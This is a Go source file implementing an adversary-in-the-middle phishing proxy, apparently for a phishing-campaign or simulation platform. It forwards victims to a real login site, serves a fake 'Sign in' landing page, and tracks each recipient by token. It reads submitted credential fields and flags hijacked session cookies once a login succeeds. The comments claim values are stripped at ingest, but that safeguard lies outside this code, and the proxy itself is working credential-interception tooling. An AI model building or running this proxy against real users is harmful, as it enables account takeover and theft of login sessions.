package aitmproxy

import (
	"bytes"
	"context"
	"encoding/json"
	"html"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// HealthPath is served locally by the proxy and never forwarded upstream.
const HealthPath = "/aitmproxy-health"

// Event kinds passed to a CaptureSink.
const (
	KindCreds   = "creds"
	KindSession = "session"
)

// CaptureSink records one proxy capture event through the orchestrator's
// existing names-only ingest boundary (source="proxy"). kind is "creds" or
// "session"; token attributes the event to a campaign recipient. The payload
// carries field/cookie NAME->value pairs; VALUES are stripped at ingest and
// never persisted — the proxy never widens that boundary. A nil sink disables
// capture (the proxy still forwards traffic).
type CaptureSink interface {
	Capture(ctx context.Context, kind, token string, payload map[string]any, ts time.Time)
}

// tokenKey is the request-context key carrying the victim token through the
// proxy so ModifyResponse can attribute a session hijack to the same recipient.
type tokenKey struct{}

// Instance is a compiled, ready-to-serve proxy for one campaign. It is built
// once at proxy start and serves every request without further profile lookups.
type Instance struct {
	compiled Compiled
	sink     CaptureSink
	logger   *slog.Logger
	rp       *httputil.ReverseProxy
	// credCanonical maps a lowercased observed field name to the configured
	// upstream_field name, so a creds event reports the profile's declared name.
	credCanonical map[string]string
}

// NewInstance compiles a profile spec into a servable proxy instance. The spec
// must already be schema-valid and runtime-supported (InstantiateFlow cleared).
func NewInstance(spec map[string]any, sink CaptureSink, logger *slog.Logger) (*Instance, error) {
	compiled, err := Compile(spec)
	if err != nil {
		return nil, err
	}
	return NewInstanceFromCompiled(compiled, sink, logger), nil
}

// NewInstanceFromCompiled builds an instance from an already-compiled profile
// (used by tests that assert the compilation separately).
func NewInstanceFromCompiled(compiled Compiled, sink CaptureSink, logger *slog.Logger) *Instance {
	if logger == nil {
		logger = slog.Default()
	}
	in := &Instance{
		compiled:      compiled,
		sink:          sink,
		logger:        logger,
		credCanonical: make(map[string]string, len(compiled.Capture.CredentialFormFields)),
	}
	for _, f := range compiled.Capture.CredentialFormFields {
		in.credCanonical[strings.ToLower(f)] = f
	}
	in.rp = in.newReverseProxy()
	return in
}

// Compiled returns the instance's compiled profile (for status reporting/tests).
func (in *Instance) Compiled() Compiled { return in.compiled }

// newReverseProxy builds the reverse proxy to the real login origin. Host is
// rewritten so vhost-based origins resolve; TLS verification stays on (the
// upstream is the legitimate origin). Session-hijack detection runs in
// ModifyResponse.
func (in *Instance) newReverseProxy() *httputil.ReverseProxy {
	target := &url.URL{
		Scheme: in.compiled.Upstream.Scheme,
		Host:   in.compiled.Upstream.Host + ":" + strconv.Itoa(in.compiled.Upstream.Port),
	}
	return &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = target.Scheme
			req.URL.Host = target.Host
			req.Host = in.compiled.Upstream.Host
		},
		Transport: &http.Transport{
			Proxy:                 http.ProxyFromEnvironment,
			MaxIdleConns:          100,
			MaxIdleConnsPerHost:   20,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			ForceAttemptHTTP2:     true,
		},
		ModifyResponse: in.modifyResponse,
		ErrorHandler: func(w http.ResponseWriter, r *http.Request, err error) {
			in.logger.Error("aitmproxy upstream error", "method", r.Method, "path", r.URL.Path, "err", err)
			w.WriteHeader(http.StatusBadGateway)
		},
	}
}

// Handler returns the full request handler: a mux (health + landing + proxy)
// wrapped in the capture middleware.
func (in *Instance) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc(HealthPath, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})
	mux.HandleFunc("/", in.rootHandler)
	return in.captureMiddleware(mux)
}

// rootHandler serves the Phase 1 placeholder landing at the exact root path and
// reverse-proxies everything else to the real origin. Real clone rendering from
// phishing_facet is Phase 2 — this is the minimal chain so /t -> proxy works.
func (in *Instance) rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/" && r.Method == http.MethodGet {
		in.serveLanding(w, r)
		return
	}
	in.rp.ServeHTTP(w, r)
}

// serveLanding writes the placeholder landing, carrying the victim token forward
// to the login path under the configured token query key so the capture chain
// works end-to-end. Phase 2 replaces this with the rendered clone.
func (in *Instance) serveLanding(w http.ResponseWriter, r *http.Request) {
	token, _ := r.Context().Value(tokenKey{}).(string)
	href := in.compiled.LoginPath
	if token != "" {
		q := url.Values{}
		q.Set(in.compiled.Capture.TokenQueryKey, token)
		href += "?" + q.Encode()
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	_, _ = io.WriteString(w, "<!doctype html><title>Sign in</title>"+
		"<p>Loading sign-in…</p>"+
		`<a href="`+html.EscapeString(href)+`">Continue</a>`)
}

// captureMiddleware strips the victim token (honoring token_query_key), stashes
// it in the request context for response-side attribution, and inspects a
// matching login POST for credential fields.
func (in *Instance) captureMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := in.takeToken(r)
		r = r.WithContext(context.WithValue(r.Context(), tokenKey{}, token))
		if token != "" && r.Method == http.MethodPost && len(in.credCanonical) > 0 && in.actionMatches(r.URL.Path) {
			in.captureCreds(r, token)
		}
		next.ServeHTTP(w, r)
	})
}

// takeToken extracts and strips the configured token query parameter so it is
// never forwarded upstream.
func (in *Instance) takeToken(r *http.Request) string {
	key := in.compiled.Capture.TokenQueryKey
	if key == "" {
		return ""
	}
	q := r.URL.Query()
	tok := q.Get(key)
	if tok != "" {
		q.Del(key)
		r.URL.RawQuery = q.Encode()
	}
	return tok
}

// actionMatches reports whether a POST path is the login surface to inspect.
// When form_action_contains is set it narrows by substring; otherwise the path
// must be exactly the login path.
func (in *Instance) actionMatches(path string) bool {
	if fa := in.compiled.Capture.FormActionContains; fa != "" {
		return strings.Contains(path, fa)
	}
	return path == in.compiled.LoginPath
}

// captureCreds reads the bounded request body, keeps only allowlisted field
// names, emits a creds event, and restores the body so the proxy forwards it
// unchanged. Values pass upstream untouched; they are stripped at ingest.
func (in *Instance) captureCreds(r *http.Request, token string) {
	if in.sink == nil || r.Body == nil {
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, in.compiled.Capture.MaxBodyBytes))
	if err != nil {
		return
	}
	// Restore the (full, bounded) body for the forward. A body larger than the
	// cap is truncated for inspection only; we still forward what we read plus
	// any remainder without buffering it all.
	r.Body = struct {
		io.Reader
		io.Closer
	}{io.MultiReader(bytes.NewReader(body), r.Body), r.Body}

	fields := parseBodyFields(body, r.Header.Get("Content-Type"))
	hits := map[string]string{}
	for name, val := range fields {
		if canonical, ok := in.credCanonical[name]; ok {
			hits[canonical] = val
		}
	}
	if len(hits) == 0 {
		return
	}
	in.sink.Capture(r.Context(), KindCreds, token, map[string]any{"fields": hits}, time.Now().UTC())
}

// modifyResponse evaluates the session success indicators against the upstream
// response and, on a match, records a session_hijacked event carrying the
// hijacked cookie NAMES (never values) and the non-secret upstream host.
func (in *Instance) modifyResponse(resp *http.Response) error {
	if in.sink == nil {
		return nil
	}
	token, _ := resp.Request.Context().Value(tokenKey{}).(string)
	if token == "" {
		return nil
	}
	if !in.successMatches(resp) {
		return nil
	}
	cookieNames := in.hijackedCookieNames(resp)
	payload := map[string]any{"cookies": namesToMap(cookieNames)}
	if host := in.compiled.Upstream.Host; host != "" {
		payload["host"] = host
	}
	in.sink.Capture(resp.Request.Context(), KindSession, token, payload, time.Now().UTC())
	return nil
}

// successMatches evaluates the compiled indicators in order. The response body
// is read (bounded, then restored) only when a body_regex indicator exists.
func (in *Instance) successMatches(resp *http.Response) bool {
	var body []byte
	if in.compiled.NeedsBody {
		body = in.readBoundedBody(resp)
	}
	setCookies := responseCookieNames(resp)
	for _, ind := range in.compiled.SuccessIndicators {
		switch ind.Type {
		case IndicatorCookieSet:
			if setCookies[ind.Name] {
				return true
			}
		case IndicatorStatusCode:
			if resp.StatusCode == ind.Code {
				return true
			}
		case IndicatorURLRedirect:
			if loc := resp.Header.Get("Location"); loc != "" && (ind.Location == "" || strings.Contains(loc, ind.Location)) {
				return true
			}
		case IndicatorBodyRegex:
			if ind.Pattern != nil && ind.Pattern.Match(body) {
				return true
			}
		}
	}
	return false
}

// readBoundedBody reads up to MaxBodyBytes for inspection and restores the full
// body (inspected prefix + un-buffered remainder) for the client.
func (in *Instance) readBoundedBody(resp *http.Response) []byte {
	if resp.Body == nil {
		return nil
	}
	buf, _ := io.ReadAll(io.LimitReader(resp.Body, in.compiled.Capture.MaxBodyBytes))
	resp.Body = struct {
		io.Reader
		io.Closer
	}{io.MultiReader(bytes.NewReader(buf), resp.Body), resp.Body}
	return buf
}

// hijackedCookieNames returns the configured session cookie names that the
// upstream actually set on this (successful) response.
func (in *Instance) hijackedCookieNames(resp *http.Response) []string {
	set := responseCookieNames(resp)
	out := make([]string, 0, len(in.compiled.SessionCookieNames))
	for _, name := range in.compiled.SessionCookieNames {
		if set[name] {
			out = append(out, name)
		}
	}
	// Fall back to the declared shape if success fired via a non-cookie
	// indicator (redirect/status) — the hijack still concerns these cookies.
	if len(out) == 0 {
		out = append(out, in.compiled.SessionCookieNames...)
	}
	return out
}

// --- helpers --------------------------------------------------------------

// responseCookieNames collects the Set-Cookie names on a response.
func responseCookieNames(resp *http.Response) map[string]bool {
	out := map[string]bool{}
	for _, sc := range resp.Header.Values("Set-Cookie") {
		if name, _, ok := splitCookie(sc); ok {
			out[name] = true
		}
	}
	return out
}

func splitCookie(sc string) (name, value string, ok bool) {
	parts := strings.SplitN(sc, "=", 2)
	if len(parts) != 2 {
		return "", "", false
	}
	name = strings.TrimSpace(parts[0])
	rest := parts[1]
	if idx := strings.IndexByte(rest, ';'); idx >= 0 {
		rest = rest[:idx]
	}
	return name, strings.TrimSpace(rest), name != ""
}

// namesToMap turns a list of names into a name->"" map so the ingest sanitizer
// (which reduces a name->value map to sorted names) records names only.
func namesToMap(names []string) map[string]string {
	m := make(map[string]string, len(names))
	for _, n := range names {
		m[n] = ""
	}
	return m
}

// parseBodyFields extracts a flat lowercased name->value map from urlencoded or
// JSON bodies (the two login POST encodings Phase 1 handles).
func parseBodyFields(body []byte, contentType string) map[string]string {
	out := map[string]string{}
	ct := strings.ToLower(strings.TrimSpace(contentType))
	switch {
	case strings.HasPrefix(ct, "application/x-www-form-urlencoded"):
		if vals, err := url.ParseQuery(string(body)); err == nil {
			for k, v := range vals {
				if len(v) > 0 {
					out[strings.ToLower(k)] = v[0]
				}
			}
		}
	case strings.HasPrefix(ct, "application/json"):
		var m map[string]any
		if err := json.Unmarshal(body, &m); err == nil {
			for k, v := range m {
				switch t := v.(type) {
				case string:
					out[strings.ToLower(k)] = t
				case float64:
					out[strings.ToLower(k)] = strconv.FormatFloat(t, 'f', -1, 64)
				}
			}
		}
	}
	return out
}
